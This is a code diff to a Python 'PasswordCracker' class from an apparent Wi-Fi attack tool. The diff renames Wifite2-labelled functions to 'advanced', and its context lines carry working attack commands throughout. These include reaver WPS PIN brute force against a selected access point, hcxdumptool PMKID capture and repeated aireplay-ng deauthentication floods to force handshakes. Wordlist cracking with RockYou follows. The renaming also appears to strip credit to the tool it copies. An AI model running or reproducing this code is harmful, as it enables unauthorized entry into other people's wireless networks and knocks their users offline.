@@ -14,32 +14,32 @@ class PasswordCracker:
         self.wordlists = {}
 
     def auto_crack_attack(self):
-        """Wifite2-style auto cracking with multiple methods"""
-        print("\033[1;36m[→] Initializing Wifite2-style auto cracking...\033[0m")
+        """advanced-style auto cracking with multiple methods"""
+        print("\033[1;36m[→] Initializing advanced-style auto cracking...\033[0m")
         
-        # Always perform fresh scan (Wifite2 behavior)
+        # Always perform fresh scan (advanced behavior)
         if self.scanner.wifi_scan():
             self.scanner.display_scan_results()
             target = self.scanner.select_target()
             
             if target:
                 print(f"\033[1;33m[🎯] Target acquired: {target['essid']}\033[0m")
-                print("\033[1;36m[⚡] Starting Wifite2-style cracking sequence...\033[0m")
+                print("\033[1;36m[⚡] Starting advanced-style cracking sequence...\033[0m")
                 
-                # Try Wifite2-style cracking methods
-                if self.wifite2_cracking_sequence(target):
+                # Try advanced-style cracking methods
+                if self.advanced_cracking_sequence(target):
                     return
                 
                 print("\033[1;31m[✘] All cracking methods failed\033[0m")
                 print("\033[1;33m[💡] Try with different wordlists or manual methods\033[0m")
 
-    def wifite2_cracking_sequence(self, target):
-        """Wifite2-style cracking sequence with multiple methods"""
+    def advanced_cracking_sequence(self, target):
+        """advanced-style cracking sequence with multiple methods"""
         methods = [
-            ("WPS PIN Attack", self.wifite2_wps_attack),
-            ("PMKID Capture", self.wifite2_pmkid_attack),
-            ("Handshake Capture", self.wifite2_handshake_attack),
-            ("Wordlist Attack", self.wifite2_wordlist_attack)
+            ("WPS PIN Attack", self.advanced_wps_attack),
+            ("PMKID Capture", self.advanced_pmkid_attack),
+            ("Handshake Capture", self.advanced_handshake_attack),
+            ("Wordlist Attack", self.advanced_wordlist_attack)
         ]
         
         for method_name, method_func in methods:
@@ -56,8 +56,8 @@ class PasswordCracker:
         
         return False
 
-    def wifite2_wps_attack(self, target):
-        """Wifite2-style WPS attack"""
+    def advanced_wps_attack(self, target):
+        """advanced-style WPS attack"""
         print("\033[1;33m[!] Checking WPS vulnerability...\033[0m")
         
         # Check if WPS is available using wash
@@ -68,7 +68,7 @@ class PasswordCracker:
             print("\033[1;32m[✓] WPS vulnerability detected\033[0m")
             print("\033[1;31m[💣] Launching WPS PIN brute force...\033[0m")
             
-            # Start reaver with Wifite2-style parameters
+            # Start reaver with advanced-style parameters
             reaver_proc = self.core.run_command(
                 f"reaver -i {self.core.mon_interface} -b {target['bssid']} -c {target['channel']} -vv -K 1 -N -A -d 2 -t 2 -T 2",
                 background=True
@@ -83,13 +83,13 @@ class PasswordCracker:
         
         return False
 
-    def wifite2_pmkid_attack(self, target):
-        """Wifite2-style PMKID attack"""
+    def advanced_pmkid_attack(self, target):
+        """advanced-style PMKID attack"""
         print("\033[1;33m[!] Attempting PMKID capture...\033[0m")
         
         pmkid_file = f"/tmp/netstrike_pmkid_{target['bssid'].replace(':', '')}"
         
-        # Use hcxdumptool for PMKID capture (Wifite2 method)
+        # Use hcxdumptool for PMKID capture (advanced method)
         capture_cmd = f"timeout 60s hcxdumptool -i {self.core.mon_interface} -o {pmkid_file}.pcapng --filterlist={target['bssid']} --filtermode=2 --enable_status=1"
         result = self.core.run_command(capture_cmd)
         
@@ -101,17 +101,17 @@ class PasswordCracker:
             self.core.run_command(convert_cmd)
             
             if os.path.exists(f"{pmkid_file}.hash"):
-                return self.wifite2_crack_pmkid(f"{pmkid_file}.hash", target)
+                return self.advanced_crack_pmkid(f"{pmkid_file}.hash", target)
         
         print("\033[1;31m[✘] PMKID capture failed\033[0m")
         return False
 
-    def wifite2_crack_pmkid(self, hash_file, target):
-        """Wifite2-style PMKID cracking with multiple wordlists"""
-        print("\033[1;36m[→] Cracking PMKID with Wifite2 wordlist strategy...\033[0m")
+    def advanced_crack_pmkid(self, hash_file, target):
+        """advanced-style PMKID cracking with multiple wordlists"""
+        print("\033[1;36m[→] Cracking PMKID with advanced wordlist strategy...\033[0m")
         
-        # Get Wifite2-style wordlists
-        wordlists = self.get_wifite2_wordlists()
+        # Get advanced-style wordlists
+        wordlists = self.get_advanced_wordlists()
         
         for wl_name, wl_path in wordlists.items():
             if wl_path and os.path.exists(wl_path):
@@ -134,8 +134,8 @@ class PasswordCracker:
         
         return False
 
-    def wifite2_handshake_attack(self, target):
-        """Wifite2-style handshake capture and cracking"""
+    def advanced_handshake_attack(self, target):
+        """advanced-style handshake capture and cracking"""
         print("\033[1;33m[!] Attempting handshake capture...\033[0m")
         
         cap_file = f"/tmp/netstrike_handshake_{target['bssid'].replace(':', '_')}"
@@ -152,7 +152,7 @@ class PasswordCracker:
         
         # Enhanced deauth attacks
         print("\033[1;31m[💣] Deploying deauth attacks...\033[0m")
-        deauth_thread = threading.Thread(target=self.wifite2_deauth_attack, args=(target,))
+        deauth_thread = threading.Thread(target=self.advanced_deauth_attack, args=(target,))
         deauth_thread.daemon = True
         deauth_thread.start()
         
@@ -170,25 +170,25 @@ class PasswordCracker:
         
         if handshake_captured:
             print("\033[1;32m[✓] Handshake captured successfully!\033[0m")
-            return self.wifite2_crack_handshake(f"{cap_file}-01.cap", target)
+            return self.advanced_crack_handshake(f"{cap_file}-01.cap", target)
         else:
             print("\033[1;31m[✘] No handshake captured\033[0m")
             return False
 
-    def wifite2_deauth_attack(self, target):
-        """Wifite2-style deauth attacks"""
+    def advanced_deauth_attack(self, target):
+        """advanced-style deauth attacks"""
         for i in range(20):
             if self.cracking_active:
                 break
             self.core.run_command(f"aireplay-ng --deauth 10 -a {target['bssid']} {self.core.mon_interface} >/dev/null 2>&1")
             time.sleep(1.5)
 
-    def wifite2_crack_handshake(self, cap_file, target):
-        """Wifite2-style handshake cracking with multiple wordlists"""
-        print("\033[1;36m[→] Cracking handshake with Wifite2 strategy...\033[0m")
+    def advanced_crack_handshake(self, cap_file, target):
+        """advanced-style handshake cracking with multiple wordlists"""
+        print("\033[1;36m[→] Cracking handshake with advanced strategy...\033[0m")
         
-        # Get Wifite2-style wordlists
-        wordlists = self.get_wifite2_wordlists()
+        # Get advanced-style wordlists
+        wordlists = self.get_advanced_wordlists()
         
         for wl_name, wl_path in wordlists.items():
             if wl_path and os.path.exists(wl_path):
@@ -209,8 +209,8 @@ class PasswordCracker:
         
         return False
 
-    def wifite2_wordlist_attack(self, target):
-        """Wifite2-style wordlist attack with existing captures"""
+    def advanced_wordlist_attack(self, target):
+        """advanced-style wordlist attack with existing captures"""
         print("\033[1;33m[!] Checking for existing captures...\033[0m")
         
         # Check for existing handshake
@@ -219,10 +219,10 @@ class PasswordCracker:
             print("\033[1;31m[✘] No handshake file found\033[0m")
             return False
         
-        return self.wifite2_crack_handshake(cap_file, target)
+        return self.advanced_crack_handshake(cap_file, target)
 
-    def get_wifite2_wordlists(self):
-        """Get Wifite2-style wordlist priority"""
+    def get_advanced_wordlists(self):
+        """Get advanced-style wordlist priority"""
         if not self.wordlists:
             self.wordlists = {
                 "RockYou": self.download_wordlist_rockyou(),
@@ -233,7 +233,7 @@ class PasswordCracker:
         return self.wordlists
 
     def download_wordlist_rockyou(self):
-        """Download RockYou wordlist (Wifite2 default)"""
+        """Download RockYou wordlist (advanced default)"""
         rockyou_path = "/usr/share/wordlists/rockyou.txt"
         
         if os.path.exists(rockyou_path):
@@ -342,7 +342,7 @@ class PasswordCracker:
             target = self.scanner.select_target()
             
             if target:
-                return self.wifite2_handshake_attack(target)
+                return self.advanced_handshake_attack(target)
         return False
 
     def wps_pin_attack(self):
@@ -355,6 +355,6 @@ class PasswordCracker:
             target = self.scanner.select_target()
             
             if target:
-                return self.wifite2_wps_attack(target)
+                return self.advanced_wps_attack(target)
         
         return False
